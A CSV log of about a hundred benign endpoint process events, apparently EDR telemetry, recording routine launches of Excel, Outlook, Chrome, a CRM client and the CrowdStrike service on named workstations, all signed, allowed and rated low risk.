event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00210,2026-09-09 14:29:39,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",032ebb653ac2ee6fd1bd4879b0dd26e02821e22b52ad881588047b621b284664,signed,ALLOWED,Low
P00211,2026-09-09 14:58:12,WKST-HR-014,mukwambi,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b0dd2c29dcc32cb9a9c7d4cd65a66281c41f3a02dd68ca7a2495f424955fcc5c,signed,ALLOWED,Low
P00212,2026-09-09 15:00:24,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",90e3a6b69954573416a24715f4476fb62b3324414b90cd3f3ccd4bc9673fb43c,signed,ALLOWED,Low
P00213,2026-09-09 15:01:20,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",727f4f5b65bb2d9d54b7057db8cc6b803b4b2301771ff697de15039a131f5e14,signed,ALLOWED,Low
P00214,2026-09-09 15:14:00,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,68ac57ee7422d6e34d26a5bc8bc35fa5123302026cde5edfc972475add9ce6a6,signed,ALLOWED,Low
P00215,2026-09-09 15:17:50,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8d28486f2b3b96a2ae8c0fe0f8b11dd81d6a1d5e3124e45670030cf96721cb73,signed,ALLOWED,Low
P00216,2026-09-09 15:35:21,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2db2f41d621255f49cc2dc9318a800f67a9a5f563f9876a278c038734d03ff02,signed,ALLOWED,Low
P00217,2026-09-09 15:52:00,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5f7c657a9f289d583db739f2d746f031ee3c36bb591587aa6c6d2b249af58d22,signed,ALLOWED,Low
P00218,2026-09-09 15:56:14,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",44f98cdc792f44d8cd1044cf96942a62807aeadba86c7a6a39a23603161e401c,signed,ALLOWED,Low
P00219,2026-09-09 16:27:19,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",5eb0fff813c519f14be338369a181fe120489d56331740daa3c888aa30794be2,signed,ALLOWED,Low
P00220,2026-09-09 16:28:00,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",069411696e20ca766c541913d784d92dd07ad8ccf03bca50d2dc4e0f2a857a20,signed,ALLOWED,Low
P00221,2026-09-09 17:04:02,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,bd58be9f7d792cd7dd244a570987407686455ae671c6ecb65a0ca86719a90af3,signed,ALLOWED,Low
P00222,2026-09-09 17:08:07,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",66ec57ee5c72bc88332323efd7a37a38b2319515682ed724e87d18ceffc37a34,signed,ALLOWED,Low
P00223,2026-09-09 17:10:54,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",fd78e9af9abcc0456686548d77a3b416196377893a2237d8a0e40dcb507cf6cc,signed,ALLOWED,Low
P00224,2026-09-09 17:22:15,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c646fad438a4190352b9c69dedc4e7f1163a453e1388a721a4dcf90a2cced9b0,signed,ALLOWED,Low
P00225,2026-09-09 17:39:05,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0194d8762c0ab1b2c67791179f8c280654aef0ada91cf844e3f5b8db487d8e1b,signed,ALLOWED,Low
P00226,2026-09-09 18:03:08,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",0ad778aeca38394b62d8198a90a86e06f2f137c0ac5ffab964e3ce24bc2852c6,signed,ALLOWED,Low
P00227,2026-09-09 18:42:50,WKST-FIN-021,jkavari,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",258c887fb3df5179ed47ada63d9ea11269665cbb1cc1f57d3f4b14f39fb7984d,signed,ALLOWED,Low
P00228,2026-09-09 18:45:01,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,060032622a3be0be6f1948b0145ef732b091f8331cf97a7663c57c9829acf4b4,signed,ALLOWED,Low
P00229,2026-09-09 18:48:25,WKST-AUD-004,tjirera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",30c6b6123c43720eb0130a4c20636ab2a25b44dcdcf60648ddaed3697e7c7c5c,signed,ALLOWED,Low
P00230,2026-09-09 19:01:14,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3788450755d9141380798859d81423c9e28ea047e7f67507fed2d7821a7aa65d,signed,ALLOWED,Low
P00231,2026-09-09 19:06:08,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",156905c8ecc596e006cc8d87a8415e1abc6bb15351278c519d4f22921ad0a07a,signed,ALLOWED,Low
P00232,2026-09-09 19:15:30,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",75fcb0f61a1a9e6239d32c91810ef8a7f43b34d1b41bf52e3e39e5e34cb9a60a,signed,ALLOWED,Low
P00233,2026-09-09 19:16:03,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",85f0da92d0841ce028e297fc225c72c04c547244d97ccd9f199001f100c953d2,signed,ALLOWED,Low
P00234,2026-09-09 19:20:00,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cc070bb3038f9900b8c96dda68e7ecc0d6fa23c79bf0d9c1ac76d69c630e94da,signed,ALLOWED,Low
P00235,2026-09-09 19:48:51,WKST-SWK-002,nduminga,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",e61c5eec305235319b2247e1be3dcc70140bff67b5dc94ca7e7077e439f1dc3b,signed,ALLOWED,Low
P00236,2026-09-10 06:00:41,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,a9d616088b5e594f32b622dd794c4651621f9f3f2fe65127d857ed225b5f8b96,signed,ALLOWED,Low
P00237,2026-09-10 06:03:23,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,70969c7930e9470a38cbc4134f2540c9310373dada3726de179bc6ad7c621b6a,signed,ALLOWED,Low
P00238,2026-09-10 06:14:29,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",37f5f2c47dc461c696115d1b60c969e292f0f67ce9d2e579bf5b2f48cc85af30,signed,ALLOWED,Low
P00239,2026-09-10 06:18:06,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,79932613a21b0aada475c50c67c8a84eb8d096a218b227e66cb2200fbc26d5a4,signed,ALLOWED,Low
P00240,2026-09-10 06:40:49,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",fd027186f4abdcc088a3fec15b178ad466e37703e67423a732de0d60d15cc223,signed,ALLOWED,Low
P00241,2026-09-10 06:51:11,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",2c64ed400a549a74bc17956a2c20c7cb4ff2cb260d615fa10cc966a95cbed106,signed,ALLOWED,Low
P00242,2026-09-10 06:58:37,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cc297a2383360fd3ce7cd4a7f47501f23a2c54077b9f2c5a52e1096c683297a0,signed,ALLOWED,Low
P00243,2026-09-10 07:01:51,WKST-HR-014,mukwambi,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c3a89340f26be1ddea9172f7755b24559b76ab9e79a66cbb33efd497d1725a1e,signed,ALLOWED,Low
P00244,2026-09-10 07:02:40,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",74c824acdfee88546b54b67ff81f658073ff65291c3c92b945eca1f16647ff75,signed,ALLOWED,Low
P00245,2026-09-10 07:28:15,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",035a669aabd9264c53305be9bb16594b9435dcacd0580a4340acd21f4b11ae66,signed,ALLOWED,Low
P00246,2026-09-10 07:29:36,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7e39b310fe30eef34cb603ca02f1afaec57b855cbecb25fdb4ccdfdcc99dcda6,signed,ALLOWED,Low
P00247,2026-09-10 07:32:24,WKST-LOAN-018,shilongo,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f1238d38edb1bb1891ab228565290211ea3be395de1f2b50713e4ba01316dff9,signed,ALLOWED,Low
P00248,2026-09-10 07:36:36,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",16cb5e918dd247bb1fd72135139c1c6d0ce9c635de6d7b3f6cf3b63241d01b4e,signed,ALLOWED,Low
P00249,2026-09-10 07:48:18,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,191dd9ea17b474e4596327fff1b866e18920aea65e7ddeae33a189d861581842,signed,ALLOWED,Low
P00250,2026-09-10 07:49:08,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",9067d91970ed46563e6f7ecb80e83c96d9476b9ed72d7fedf610107cb5e236c1,signed,ALLOWED,Low
P00251,2026-09-10 08:02:09,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3e64d2f4e93a13c6f88d37c6c63d79134c66f54360fdb634164517662d254b59,signed,ALLOWED,Low
P00252,2026-09-10 08:02:50,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,01bdef3ee959bf891bc18fa49fc85b4f1aa833b73fa745726f7479e6d597013d,signed,ALLOWED,Low
P00253,2026-09-10 08:31:56,WKST-MKT-010,ntinda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,209889124a5025946c6e3110f25ce8619d0cd3fc18d59c27fe11f68cdcc5a317,signed,ALLOWED,Low
P00254,2026-09-10 08:32:42,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",928df202d5bb6980484fbd8c01a1e276ca1091c25248e37c0b3947ff6ddaf38d,signed,ALLOWED,Low
P00255,2026-09-10 08:48:54,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2c67c5aefb9dbdc019a4f05489448ea5bab594e6ab7550e1655bd617e4386a2e,signed,ALLOWED,Low
P00256,2026-09-10 09:16:44,WKST-RSK-006,murorua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,71c1c219bffddaf9057966f4c15697d88c351105fefa7cc69b06c7162f012739,signed,ALLOWED,Low
P00257,2026-09-10 09:27:59,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",71f9382290f4923cb95029e218c89962501b115f8914ee13caae8f98300badf9,signed,ALLOWED,Low
P00258,2026-09-10 09:49:51,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2bda062a46282cb3c22db0c823a0c7040924e2c320018e917b2bd4fe4a82a6c1,signed,ALLOWED,Low
P00259,2026-09-10 10:11:56,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",26efa100b2ba801d3392a3f71fdfb51758fe6b4951049a6cc4babc501c35881f,signed,ALLOWED,Low
P00260,2026-09-10 10:15:21,WKST-PRC-008,sankwasa,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c96964d11b4448ef29c56bbfb2a5966fc681628d54cc97da6ab9c0dc7345f076,signed,ALLOWED,Low
P00261,2026-09-10 10:17:03,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",2660a14af504795c987141083cd123ddd0690f062739179a769decf56f6cec36,signed,ALLOWED,Low
P00262,2026-09-10 10:20:51,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",5dae41734227f5edae8721fbe85899404d6aafebd3fecaf5d0cbfe353224cb35,signed,ALLOWED,Low
P00263,2026-09-10 10:49:28,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3794ac57fa75db40e108df6d1b1df2c00f54fec7ea435730b3a821d84fb80bd6,signed,ALLOWED,Low
P00264,2026-09-10 11:01:34,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",178f266e4d1e59858a43c9adc6625df18cd2640398b2062aa90cd5970753b321,signed,ALLOWED,Low
P00265,2026-09-10 11:16:26,WKST-SWK-002,nduminga,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",e30092c8128f14bb770271e16441282ea1d1e0ce7a1e128b1c078c4c0d6d0f5b,signed,ALLOWED,Low
P00266,2026-09-10 11:36:23,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",08fea614a9b1405765616266a2b3a1404e74c4556d3062454be8d875fd83c0fb,signed,ALLOWED,Low
P00267,2026-09-10 11:48:31,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",19ccea98a9d6017c05e220b695368c73d7877d6ed200698deea3e0967118302c,signed,ALLOWED,Low
P00268,2026-09-10 12:28:29,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",ace9aef0c176adacd745fbea04d3857e93cb4609a6cabac9dc1bdbbb09e69f4d,signed,ALLOWED,Low
P00269,2026-09-10 13:15:00,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",12ec52dc98784db64f6535e1d342ae03d3baf9affc2ceb90a8b5bd30d90a51c1,signed,ALLOWED,Low
P00270,2026-09-10 13:21:46,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",65e223a8b1fd29d07713b8c4792ef552941cef31410f364e997c6d7eb1714903,signed,ALLOWED,Low
P00271,2026-09-10 13:22:00,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b46d942a6b3df926c89870ef09752008b7cb2dae1fb6ab2ad2f2f9fddf3b4c92,signed,ALLOWED,Low
P00272,2026-09-10 13:22:40,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",64d4192042e07e4d3ea388c8b81a8faa3a3e44ee00461acd61980ab814d8fef2,signed,ALLOWED,Low
P00273,2026-09-10 13:35:23,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b629893e4eb98707ddcd6bef3a07ca19ba062ee127ea91b0f353108595c97770,signed,ALLOWED,Low
P00274,2026-09-10 14:12:55,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d00da3b37dceace719d7c1b556b2e9c3ebd279d7388bdf794628781afefcf513,signed,ALLOWED,Low
P00275,2026-09-10 14:13:12,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",c3b3cec1143f13d3dc40ce202bb5078d22a6d84fc1467d0b864eae65228522ae,signed,ALLOWED,Low
P00276,2026-09-10 14:33:15,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d2c746e5300270061b7464e077502c931306dce2651a659d5130ca0e351dce32,signed,ALLOWED,Low
P00277,2026-09-10 14:39:35,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",4266c3958466be444f1ae546e128a3e664d6c93ede85e1ad2d03648f0e766d83,signed,ALLOWED,Low
P00278,2026-09-10 14:41:14,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",13b323586d822ea09bb2df3d61021b8ed1998078b894c693bb92bd8da1e46fe3,signed,ALLOWED,Low
P00279,2026-09-10 14:42:25,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1c3a860f3df2efe439492c061860ca45ca77b2afaa56f22bc03d4f26678154d7,signed,ALLOWED,Low
P00280,2026-09-10 14:46:20,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d9f37d57fd6977ab50d46dfa493fb6145833de498492792638f63bc5b2e9f6af,signed,ALLOWED,Low
P00281,2026-09-10 15:00:19,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c6a2321ca49d81781f1f989bb2805205e3eeacc6188922612243270ed190f7a7,signed,ALLOWED,Low
P00282,2026-09-10 15:26:37,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",77ff953968e4d72fbb3a669038acb2bf23c046b0a249c375aa6f6bc28a1777b7,signed,ALLOWED,Low
P00283,2026-09-10 15:47:12,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ca590cc387e5e254895007c3cad26ca2bd77ca92e99e8a2c7f9728d716188121,signed,ALLOWED,Low
P00284,2026-09-10 15:51:35,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f100d56abfb06e09ae1b16b94c08a591e054e14a33729a15a2abe618e796d253,signed,ALLOWED,Low
P00285,2026-09-10 15:52:43,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b2b6e5fbad7d873f98d94479bc89d72396cd327bba0ac5ccec62773962b7aec9,signed,ALLOWED,Low
P00286,2026-09-10 16:10:16,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",01d02077d035f4de8edc4442822cae940d4865e87a697482b04c6892011207fb,signed,ALLOWED,Low
P00287,2026-09-10 16:10:33,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c519af74796e4b131bb916014c3e1497e3bd863b819785cfb9604a2b9380367a,signed,ALLOWED,Low
P00288,2026-09-10 16:55:23,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3fe3584f7e1d272dd6ca128503ff113a0e997abb503e01fae74758d1f249d401,signed,ALLOWED,Low
P00289,2026-09-10 17:10:33,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",51dea11536776fd098dcb746421f3c9071ad1104b7cc7b13b7f88e0eb05b86d2,signed,ALLOWED,Low
P00290,2026-09-10 17:24:59,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",582b147c45382c456df2c7e1a0a28b649d258299be30fe088553ca2109bf1a6f,signed,ALLOWED,Low
P00291,2026-09-10 17:32:37,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,95966c53a4f7f18a77cfa4293ca565f43300e03c67bf9056057fd1c51f0a9928,signed,ALLOWED,Low
P00292,2026-09-10 17:44:42,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d8633def7bc0ea23928c8dcc0abb975c0537e2acd3fc68a692e41162279946a2,signed,ALLOWED,Low
P00293,2026-09-10 17:46:16,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c344adc6d6568d56b0e42c2032065e8afe26ec94dfb261a44b1e4093ba9103dd,signed,ALLOWED,Low
P00294,2026-09-10 17:48:55,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,42fce79d726deb5b4a5bbd87e9634a48a370863d402d08f18d8611c4a0859471,signed,ALLOWED,Low
P00295,2026-09-10 17:54:36,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,34e55de0a27a8108e807b294d39611aa8c065fca64213fe09248f669122617db,signed,ALLOWED,Low
P00296,2026-09-10 17:54:46,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",229151b4792835a63408c98e99808b699737438496d9dba727aec33f3cc3616e,signed,ALLOWED,Low
P00297,2026-09-10 17:56:29,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ab91550ddb0c716f093ab34b5a68b484d10198cce9a53f14ee29e7b6f1424349,signed,ALLOWED,Low
P00298,2026-09-10 18:07:56,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",8553694fe0e9df26d29b46274a13a138cf58d27ac9d5f918f620509f43a0c0fd,signed,ALLOWED,Low
P00299,2026-09-10 18:22:03,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a1edb21f4f5ede343d95ed34f78d2d2f72ee2105483c759fb7110604bd3bf5eb,signed,ALLOWED,Low
P00300,2026-09-10 18:27:50,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f960d5182f1c08bcc2dafa3aea1b809d94ffbbed060f58defbf52e0fde19e8fb,signed,ALLOWED,Low
P00301,2026-09-10 18:30:12,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,1e6e651e60c0ba94ac1adb5bdda8e2399a1ce46e3e752c1f3f4898ba4a7a7b21,signed,ALLOWED,Low
P00302,2026-09-10 18:40:11,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c21382dc9dd13f5aeacf1b5fba36f9ce9c91fa8bc5d80f67a8a005a2aa5165b9,signed,ALLOWED,Low
P00303,2026-09-10 18:44:41,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b2c6b9b456c8f1610a7679e68818cfdc8ce1f865b21204d700256a50bf92fb53,signed,ALLOWED,Low
P00304,2026-09-10 18:46:55,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,47436c86f3496d414de468c4c18d36fd5b1d064c6785434f3235b4f3bf00acb3,signed,ALLOWED,Low
P00305,2026-09-10 18:55:17,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ad3e4bfd15789004a6b25ee8984dc30d11452c5f896750709e51a6c8af40d324,signed,ALLOWED,Low
P00306,2026-09-10 19:19:13,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,be802bdb54703819c6e2a3e5c80d885869e633428fc5ef3c99e0b02a15ca1510,signed,ALLOWED,Low
P00307,2026-09-10 19:24:52,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,51c39f8fe6071924781327639589933898e555a0ee2ab76f853ba3e05f582d48,signed,ALLOWED,Low
P00308,2026-09-10 19:28:01,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",cf9f7409d13fe7a242833f4c628cbeea649b399abf39fe45ddb6e712e51b9186,signed,ALLOWED,Low
P00309,2026-09-10 19:30:23,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f31f3afe51d1dd607fa6a5ab700049dd0535f702872564333120b98d23cea2b9,signed,ALLOWED,Low
P00310,2026-09-10 19:33:11,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",272e479750cf3fccbe5387c0607b0083022096922bf4afba87b14ef7c1c98bd7,signed,ALLOWED,Low
P00311,2026-09-10 19:33:50,WKST-SWK-008,sihuhua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",7888157765077bdde578ddefcc5e6ed39703758f405a3f67befae1584265aada,signed,ALLOWED,Low
P00312,2026-09-10 19:35:11,WKST-LGL-005,mbandeka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7a59972fa4914afe4b70b5171225cea395b2f9bac6c03a25e233b3caf94535f9,signed,ALLOWED,Low
P00313,2026-09-10 19:41:04,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",edc014ad43f940a36225dd7edeef3077e40926e8d135fa62d6f075a5ceb74b77,signed,ALLOWED,Low
P00314,2026-09-10 19:44:04,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d00e4440cf5f6bfba77c0f32444479364f73c01ea11bda9291dbb5e67c902335,signed,ALLOWED,Low
